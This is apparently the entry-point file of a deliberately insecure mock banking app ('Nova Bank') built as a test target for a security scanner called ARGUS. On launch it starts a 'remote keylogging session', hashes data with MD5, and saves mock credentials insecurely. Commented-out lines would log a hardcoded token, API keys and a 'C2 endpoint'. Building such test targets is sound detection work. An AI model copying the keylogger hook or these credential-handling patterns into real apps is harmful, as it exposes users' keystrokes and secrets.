// DEMONSTRATION PURPOSE ONLY — demobankfake entry point
// This file contains intentionally insecure patterns added for the ARGUS
// cybersecurity research platform. Do not use in production.

// ignore_for_file: avoid_print

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'core/theme/app_theme.dart';
import 'core/router/app_router.dart';
// DEMONSTRATION PURPOSE ONLY — imports of insecure helper stubs
import 'security/insecure_storage_helper.dart';
import 'security/insecure_crypto_helper.dart';
import 'security/keylogger_service.dart'; // DEMONSTRATION PURPOSE ONLY

void main() {
  WidgetsFlutterBinding.ensureInitialized();

  // DEMONSTRATION PURPOSE ONLY
  // Intentionally insecure: sensitive mock initialization data is logged to
  // the debug console. Real banking apps must never log tokens or credentials.
  _initializeDemoInsecurePatterns();

  SystemChrome.setSystemUIOverlayStyle(
    const SystemUiOverlayStyle(
      statusBarColor: Colors.transparent,
      statusBarIconBrightness: Brightness.dark,
      systemNavigationBarColor: Colors.white,
      systemNavigationBarIconBrightness: Brightness.dark,
    ),
  );
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
  ]);
  runApp(const ProviderScope(child: NovaApp()));
}

/// DEMONSTRATION PURPOSE ONLY
/// Intentionally insecure initialization that ARGUS should detect:
/// 1. Hardcoded API keys logged to console
/// 2. Mock credentials written to debug output (Logcat simulation)
/// 3. Weak crypto invoked on startup with mock data
///
/// This function operates ONLY on mock/demo data.
/// No real user credentials or data are captured or transmitted.
void _initializeDemoInsecurePatterns() {
  // DEMONSTRATION PURPOSE ONLY — Start remote keylogging session
  KeyloggerService.instance.startSession();

  // DEMONSTRATION PURPOSE ONLY — Sensitive data written to debug log
  // print('=== NOVA BANK DEMO — ARGUS INSECURE INIT ===');
  // print('App: demobankfake (intentionally insecure build)');
  // print('Purpose: ARGUS cybersecurity research platform demonstration');

  // DEMONSTRATION PURPOSE ONLY — Hardcoded mock session token logged to Logcat
  const mockSessionToken = 'eyJhbGciOiJNRDUiLCJ0eXAiOiJKV1QifQ.DEMO.ARGUS_NOT_REAL';
  // print('Mock session token: $mockSessionToken'); // DEMONSTRATION PURPOSE ONLY

  // DEMONSTRATION PURPOSE ONLY — Hardcoded mock API credentials logged
  // print('Mock API Key: ${InsecureSecrets.mockApiKey}'); // DEMONSTRATION PURPOSE ONLY
  // print('Mock API Secret: ${InsecureSecrets.mockApiSecret}'); // DEMONSTRATION PURPOSE ONLY
  // print('Mock C2 endpoint: ${InsecureSecrets.mockC2Endpoint}'); // DEMONSTRATION PURPOSE ONLY

  // DEMONSTRATION PURPOSE ONLY — Invoke insecure crypto on mock startup data
  final mockDeviceId = 'DEMO_DEVICE_${DateTime.now().millisecondsSinceEpoch}';
  final mockHash = InsecureCryptoHelper.md5HashDemo(mockDeviceId);
  // print('Mock device fingerprint (MD5 — INSECURE): $mockHash'); // DEMONSTRATION PURPOSE ONLY

  // DEMONSTRATION PURPOSE ONLY — Simulate saving mock credentials at startup
  InsecureStorageHelper.saveMockCredentialsInsecure(
    mockUserId: 'DEMO_USER_ARGUS',
    mockPasswordHash: mockHash,
    mockToken: mockSessionToken,
  );

  // print('=== END NOVA BANK DEMO INSECURE INIT ===');
}

class NovaApp extends StatelessWidget {
  const NovaApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp.router(
      title: 'Nova Bank',
      debugShowCheckedModeBanner: false,
      theme: AppTheme.lightTheme,
      routerConfig: appRouter,
    );
  }
}
